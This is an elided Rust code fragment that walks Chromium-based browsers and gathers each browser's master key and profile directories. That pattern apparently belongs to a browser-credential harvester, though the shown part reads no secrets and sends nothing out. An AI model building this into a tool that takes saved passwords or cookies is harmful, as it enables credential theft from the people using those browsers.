...
pub struct ChromiumTask<'a> {
    tasks: Vec<(&'a ChromiumBasedBrowser<'a>, CompositeTask)>,
}
...
impl ChromiumTask {
    pub(crate) fn new() -> Self {
        ...
        for base_browser in &all_browsers {
            let Some(browser) = Self::get_browser(base_browser) else {
                continue
            };
    ...
    fn get_browser(browser: &ChromiumBasedBrowser) -> Option<Browser> {
        ...
        if !browser.has_profiles {
            return Some(Browser {
                master_key,
                profiles: vec![browser.user_data]
            })
        }
        ...
        for profile in browser.user_data.list_files_filtered(&|path| path.is_dir())? {
            let Some(inner_files) = browser.user_data.list_files() else {
                continue
            };
